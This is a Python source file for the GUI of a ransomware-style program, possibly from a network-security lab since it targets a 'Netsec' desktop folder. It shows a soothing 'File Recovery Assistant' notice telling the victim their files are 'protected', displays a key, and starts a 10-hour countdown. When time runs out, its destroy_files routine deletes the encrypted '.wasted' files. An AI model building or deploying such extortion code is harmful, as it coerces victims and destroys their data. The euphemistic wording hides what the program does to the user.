from tkinter import Tk, Frame, Label, Button, StringVar, Text, messagebox, Entry
import threading
import time
import os
import platform
from maindecrypt import decrypt
import discover  # Make sure this exists

class MainWindow(Tk):
    def __init__(self, encrypted_key_b64):  # <-- fixed __init_
        super().__init__()  # <-- fixed __init_

        # Window setup
        self.title("File Recovery Assistant")
        self.geometry("800x600")
        self.configure(background='#f0f8ff')  # light blue background
        self.resizable(False, False)

        self.encrypted_key_b64 = encrypted_key_b64

        # Exit shortcut
        self.bind("<Escape>", lambda e: self.destroy())
        self.bind("<Control-Alt-q>", lambda e: self.destroy())

        # Main frame
        main_frame = Frame(self, background='#f0f8ff')
        main_frame.pack(expand=True)

        # Friendly recovery message
        message = f'''Important Notice:
Some of your files are currently protected for security reasons.
To restore access, please use the recovery key provided to you.

Recovery Key:
[begin_key]
{self.encrypted_key_b64}
[end_key]

Please keep this key safe until recovery is complete.
'''

        Label(main_frame, text=message, wraplength=700, font='Helvetica 12',
              foreground='black', background='#f0f8ff', justify='left', padx=20, pady=10).pack(pady=(10, 20))

        # Countdown
        Label(main_frame, text='Time Remaining to Recover Files:', font='Helvetica 16 bold',
              foreground='#333', background='#f0f8ff').pack()

        self.time_left_var = StringVar(value="600:00")
        Label(main_frame, textvariable=self.time_left_var, font='Helvetica 28 bold',
              foreground='darkblue', background='#f0f8ff').pack(pady=(0, 20))

        # Key Entry
        Label(main_frame, text="Enter your recovery key below:", 
              font='Helvetica 14', fg='black', bg='#f0f8ff').pack(pady=(10, 5))

        self.key_var = StringVar()
        Entry(main_frame, textvariable=self.key_var, font='Helvetica 14', width=50).pack(pady=5)

        # Buttons
        button_frame = Frame(main_frame, background='#f0f8ff')
        button_frame.pack(pady=20)

        Button(button_frame, text="Recover Files", command=self.manual_decrypt,
               font='Helvetica 14', bg='lightgreen', padx=20, pady=5).grid(row=0, column=0, padx=10)

        Button(button_frame, text="Exit", command=self.destroy,
               font='Helvetica 14', bg='lightcoral', padx=20, pady=5).grid(row=0, column=1, padx=10)

        # Start countdown timer
        threading.Thread(target=self.start_timer, daemon=True).start()

    def manual_decrypt(self):
        key = self.key_var.get().strip()
        if not key:
            messagebox.showerror("Missing Key", "Please enter your recovery key.")
            return
        try:
            decrypt(key)
            messagebox.showinfo("Success", "Your files have been successfully recovered.")
            self.destroy()
        except Exception as e:
            messagebox.showerror("Recovery Failed", f"Error: {e}")

    def start_timer(self):
        s = 600 * 60  # 10 hours
        while s != -1:
            mins, secs = divmod(s, 60)
            self.time_left_var.set(f"{mins:02d}:{secs:02d}")
            time.sleep(1)
            s -= 1

        print("[*] Time expired. Cleaning up...")
        self.destroy_files()

    def destroy_files(self):
        # Attempt to remove protected files if not recovered
        if platform.system() in ["Linux", "Darwin"]:
            startdirs = [os.environ.get('HOME', '') + '/Desktop/Netsec']
        else:
            startdirs = [os.environ.get('USERPROFILE', '') + '\\Desktop\\Netsec']

        extension = ".wasted"
        for currentDir in startdirs:
            for file in discover.discoverFiles(currentDir):
                if file.endswith(extension):
                    try:
                        os.remove(file)
                        print(f"[Deleted] {file}")
                    except Exception as e:
                        print(f"[Error] Could not delete {file}: {e}")

        messagebox.showinfo("Notice", "Recovery time expired. Some files were cleaned up.")
        self.destroy()

# Run GUI
if __name__ == "__main__":  # <-- fixed __name_ and _main_
    encrypted_key = "YourEncryptedKeyHere"  # Replace this
    app = MainWindow(encrypted_key)
    app.mainloop()
